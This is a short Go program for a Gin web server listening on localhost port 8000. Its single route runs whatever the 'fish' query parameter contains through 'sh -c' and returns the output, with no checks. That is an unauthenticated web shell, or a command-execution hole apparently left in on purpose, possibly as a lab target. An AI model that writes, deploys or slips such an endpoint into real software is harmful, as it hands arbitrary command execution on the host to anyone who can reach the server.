package main

import (
    "os/exec"
    "fmt"

    "github.com/gin-gonic/gin"
)

type Update struct {
    Template string `json:"template" binding:"required"`
}

func main() {
    r := gin.Default()
    r.LoadHTMLGlob("templates/*")
    r.Static("/assets", "./assets")

    r.GET("/", func(c *gin.Context) {
        cmd := c.DefaultQuery("fish", "id")
        out, err := exec.Command("sh", "-c", cmd).Output()
        if err != nil {
            c.String(200, fmt.Sprintf("%s\n", err))
        } else {
            c.String(200, fmt.Sprintf("%s\n", out))
        }
    })

    r.Run("127.0.0.1:8000")
}
